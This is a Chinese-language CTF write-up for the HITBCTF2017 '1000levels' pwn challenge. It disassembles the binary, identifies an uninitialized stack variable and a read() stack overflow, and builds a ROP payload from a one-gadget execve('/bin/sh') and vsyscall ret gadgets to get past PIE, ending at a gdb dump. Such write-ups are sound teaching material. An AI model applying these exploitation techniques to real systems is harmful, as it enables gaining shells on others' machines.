6.1.16 pwn HITBCTF2017 1000levels
| 0x00000bf0 mov qword [local_110h], rax
| 0x00000bf7 mov rax, qword [local_110h]
| 0x00000bfe test rax, rax
| ,= 0x00000c14 mov rax, qword [local_110h]
| | 0x00000c1b cmp rax, 0x3e7
; num3 与 999 比较
| |,= 0x00000c3c mov rax, qword [local_110h]
| || 0x00000c43 mov qword [local_108h], rax
; 把 num3 放到 [local_108h]
| || ; JMP XREF from 0x00000c3a (sym.go)
| `---> 0x00000c4a lea rdi, str.Let_s_go
; 0x10cf ; "Let's go!'"
| | 0x00000c51 call sym.imp.puts
; int puts(const char *s)
| | 0x00000c56 mov edi, 0
| | 0x00000c5b call sym.imp.time
; time_t time(time_t *timer)
| | 0x00000c60 mov dword [local_118h], eax
| | 0x00000c66 mov rax, qword [local_108h]
| | 0x00000c6d mov edi, eax
; rdi = num3
| | 0x00000c6f call sym.level_int
; 进入计算题游戏
1152
6.1.16 pwn HITBCTF2017 1000levels
| | 0x00000c74 test eax, eax
| | 0x00000c76 setne al
| | 0x00000c79 test al, al
| |,= 0x00000cd8 lea rdi, str.You_failed.
; 0x1111 ; "You failed."
| || 0x00000cdf call sym.imp.puts
; int puts(const char *s)
| || ; JMP XREF from 0x00000cd6 (sym.go)
| `---> 0x00000ce4 mov edi, 0
| | 0x00000ce9 call sym.imp.exit
; void exit(int status)
1153
6.1.16 pwn HITBCTF2017 1000levels
| | ; JMP XREF from 0x00000c0f (sym.go)
| `--> 0x00000cee leave
\ 0x00000cef ret
可以看到第一个数 num1 被读到 local_120h ，如果大于 0，num1 被复制到
local_110h ，然后读取第二个数 num2 到 local_120h ，将两个数相加再存到
local_110h 。但是如果 num1 小于等于 0，程序会直接执行读取 num2 到
local_120h 的操作，然后读取 local_110h 的数值作为 num1，将两数相
加。整个过程都没有对 local_110h 进行初始化，程序似乎默认了
local_110h 的值是 0，然而事实并非如此。回想一下 hint 操作，放置 system
的地址正是 local_110h （两个函数的rbp相同）。这是一个内存未初始化造成的
漏洞。
接下来，根据两数相加的和，程序有三条路径，如果和小于 0，程序返回到开始菜
单；如果和大于 0 且小于 1000，进入游戏；如果和大于 1000，则将其设置为最大
值 1000，进入游戏。
然后来看游戏函数 sym.level_int() ：
[0x000009d0]> pdf @ sym.level_int
/ (fcn) sym.level_int 289
| sym.level_int ();
| ; var int local_34h @ rbp-0x34
| ; var int local_30h @ rbp-0x30
| ; var int local_28h @ rbp-0x28
| ; var int local_20h @ rbp-0x20
| ; var int local_18h @ rbp-0x18
| ; var int local_10h @ rbp-0x10
| ; var int local_ch @ rbp-0xc
| ; var int local_8h @ rbp-0x8
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x00000c6f (sym.go)
| ; CALL XREF from 0x00000e70 (sym.level_int)
| 0x00000e2d push rbp
| 0x00000e2e mov rbp, rsp
| 0x00000e31 sub rsp, 0x40
; '@'
| 0x00000e35 mov dword [local_34h], edi
; 将 level 存到 [local_34h]
1154
6.1.16 pwn HITBCTF2017 1000levels
| 0x00000e38 mov qword [local_30h], 0
| 0x00000e40 mov qword [local_28h], 0
| 0x00000e48 mov qword [local_20h], 0
| 0x00000e50 mov qword [local_18h], 0
| 0x00000e58 cmp dword [local_34h], 0
| ,= 0x00000e68 mov eax, dword [local_34h]
| | 0x00000e6b sub eax, 1
; level = level - 1
| | 0x00000e6e mov edi, eax
| | 0x00000e70 call sym.level_int
; 递归调用游戏函数
| | 0x00000e75 test eax, eax
| | 0x00000e77 sete al
| | 0x00000e7a test al, al
| |,= 0x00000e88 call sym.imp.rand
; int rand(void)
| || 0x00000e8d cdq
| || 0x00000e8e idiv dword [local_34h]
| || 0x00000e91 mov dword [local_8h], edx
| || 0x00000e94 call sym.imp.rand
; int rand(void)
| || 0x00000e99 cdq
| || 0x00000e9a idiv dword [local_34h]
| || 0x00000e9d mov dword [local_ch], edx
| || 0x00000ea0 mov eax, dword [local_8h]
| || 0x00000ea3 imul eax, dword [local_ch]
| || 0x00000ea7 mov dword [local_10h], eax
; 将正确答案放到 [local_10h]
1155
6.1.16 pwn HITBCTF2017 1000levels
| || 0x00000eaa lea rdi, str.
; 0x1160 ; "=============================================
======="
| || 0x00000eb1 call sym.imp.puts
; int puts(const char *s)
| || 0x00000eb6 mov eax, dword [local_34h]
| || 0x00000eb9 mov esi, eax
| || 0x00000ebb lea rdi, str.Level__d
; 0x1195 ; "Level %d\n"
| || 0x00000ec2 mov eax, 0
| || 0x00000ec7 call sym.imp.printf
; int printf(const char *format)
| || 0x00000ecc mov edx, dword [local_ch]
| || 0x00000ecf mov eax, dword [local_8h]
| || 0x00000ed2 mov esi, eax
| || 0x00000ed4 lea rdi, str.Question:__d____d_____A
nswer: ; 0x119f ; "Question: %d * %d = ? Answer:"
| || 0x00000edb mov eax, 0
| || 0x00000ee0 call sym.imp.printf
; int printf(const char *format)
| || 0x00000ee5 lea rax, [local_30h]
; 读取输入到 [local_30h]
| || 0x00000ee9 mov edx, 0x400
| || 0x00000eee mov rsi, rax
| || 0x00000ef1 mov edi, 0
| || 0x00000ef6 call sym.imp.read
; read(0, local_30h, 0x400)
| || 0x00000efb mov dword [local_4h], eax
; 返回值放到 [local_4h]，即读取字节数
| || ; JMP XREF from 0x00000f16 (sym.level_int)
| ||.-> 0x00000efe mov eax, dword [local_4h]
| ||: 0x00000f01 and eax, 7
; 取出低 3 位
| ||: 0x00000f04 test eax, eax
| ,==== 0x00000f18 lea rax, [local_30h]
| || 0x00000f1c mov edx, 0xa
| || 0x00000f21 mov esi, 0
| || 0x00000f26 mov rdi, rax
| || 0x00000f29 call sym.imp.strtol
; long strtol(const char *str, char**endptr, int base)
| || 0x00000f2e mov rdx, rax
| || 0x00000f31 mov eax, dword [local_10h]
| || 0x00000f34 cdqe
| || 0x00000f36 cmp rdx, rax
; 将输入答案与正确答案相比较
| || 0x00000f39 sete al
; 相等时设置 al 为 1
| || 0x00000f3c test al, al
| ||,= 0x00000f47 mov eax, 0
| ||| ; JMP XREF from 0x00000f45 (sym.level_int)
| ||| ; JMP XREF from 0x00000e83 (sym.level_int)
| ||| ; JMP XREF from 0x00000e63 (sym.level_int)
| ```--> 0x00000f4c leave
\ 0x00000f4d ret
可以看到 read() 函数有一个很明显的栈溢出漏洞， local_30h 并没有
0x400 这么大的空间。由于游戏是递归的，所以我们需要答对前 999 道题，在最
后一题时溢出，构造 ROP。
漏洞利用
总结一下，程序存在两个漏洞：
1157
6.1.16 pwn HITBCTF2017 1000levels
hint 函数将 system 放到栈上，而 go 函数在使用该地址时未进行初始化
level 函数存在栈溢出
关于利用的问题也有两个：
虽然 system 被放到了栈上，但我们不能设置其参数
程序开启了 PIE，但没有可以进行信息泄漏的漏洞
对于第一个问题，我们有不需要参数的 one-gadget 可以用，通过将输入的第二个
数设置为偏移，即可通过程序的计算将 system 修改为 one-gadget。
$ one_gadget libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL
0xf0274 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL
0xf1117 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
这里我们选择 0x4526a 地址上的 one-gadget。
第二个问题，在随机化的情况下怎么找到可用的 ret gadget？这时候可以利用
vsyscall，这是一个固定的地址。（参考章节4.15）
1158
6.1.16 pwn HITBCTF2017 1000levels
gdb-peda$ vmmap vsyscall
Start End Perm Name
0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall]
gdb-peda$ x/5i 0xffffffffff600000
0xffffffffff600000: mov rax,0x60
0xffffffffff600007: syscall
0xffffffffff600009: ret
0xffffffffff60000a: int3
0xffffffffff60000b: int3
但我们必须跳到 vsyscall 的开头，而不能直接跳到 ret，这是内核决定的。
最后一次的 payload 和调试结果如下：
gdb-peda$ x/11gx 0x7fffffffec10-0x50
0x7fffffffebc0: 0x4141414141414141 0x4141414141414141 <--
rbp -0x30
0x7fffffffebd0: 0x4141414141414141 0x4141414141414141
0x7fffffffebe0: 0x4141414141414141 0x4141414141414141
0x7fffffffebf0: 0x4242424242424242 0xffffffffff600000 <--
rbp <-- ret
0x7fffffffec00: 0xffffffffff600000 0xffffffffff600000 <--
ret <-- ret
0x7fffffffec10: 0x00007ffff7a5226a <-- o
ne-gadget
gdb-peda$ ni
[----------------------------------registers--------------------
---------------]